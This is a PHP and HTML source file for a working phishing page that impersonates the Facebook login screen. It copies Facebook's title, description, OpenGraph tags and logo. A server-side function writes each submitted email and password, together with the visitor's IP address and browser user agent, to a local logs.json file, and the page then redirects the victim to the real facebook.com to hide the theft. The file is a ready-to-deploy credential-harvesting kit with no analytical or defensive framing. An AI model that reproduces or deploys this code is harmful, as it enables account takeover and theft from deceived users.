<?php 
	function save($data1, $data2){
		$arr_to_save = array(
			"username" => $data1,
			"password" => $data2,
			"ip" => $_SERVER['REMOTE_ADDR'],
			"user_agent" => $_SERVER["HTTP_USER_AGENT"]
		);
		$hndl = fopen("logs.json", "a+");
		fwrite($hndl, (string)json_encode($arr_to_save) . "\n");
		fclose($hndl);
	}
	if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["from_form"]) && $_POST["from_form"] == "#_="){
		save($_POST["email"], $_POST["pass"]);
		echo "<script>window.location='https://facebook.com/';</script>";
	}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="theme-color" content="#3b5998">
	<meta name="description" content="შCreate an account or log into Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates.">
	<link rel="shortcut icon" type="image/png" href="favico.png">
	<link rel="favicon" type="image/png" href="favico.png">
	<meta property="og:site_name" content="Facebook">
	<meta property="og:type" content="website">
	<meta property="og:title" content="Facebook - Log In or Sign Up">
	<meta property="og:description" content="Create an account or log into Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates.">
	<meta property="og:image" content="favico.png">
	<meta property="og:url" content="https://www.facebook.com/">
	<link rel="stylesheet" type="text/css" href="fb.css">
	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
	<title>Facebook - Log In or Sign Up</title>
</head>
<body>

	<header>
	  <p>Yet login to show visitors</p>
	</header>	 
	<main>
	  <img src=" fb-logo.svg" width="160px" alt="facebook.">
	  <form action="" method="post" autocomplete="off">
	    <input type="hidden" name="from_form" value="#_=">
		<input type="text" name="email" placeholder="Mobile number or email" required>
		<input type="password" name="pass" placeholder="Password" required>
		<button type="submit">Log In</button>
	  </form>
	  <span>or</span><br><br>
      <button class="reg-btn">Create New Account</button><br><br>
	  <a href="#" class="f">Forgot password?</a>
	  <div class="langs">
	    <div>
		  <a href="#">English (US)</a>
		  <a href="#">Русский</a>
		  <a href="#">Deutsch</a>
		  <a href="#">Português (Brasil)</a>
		</div>
		<div>
	   	  <a href="#">ქართული</a>
		  <a href="#">Türkçe</a>
		  <a href="#">Espanol</a>
		  <a href="#">More</a>
		</div>
	  </div>
	</main>
	
</body>
</html>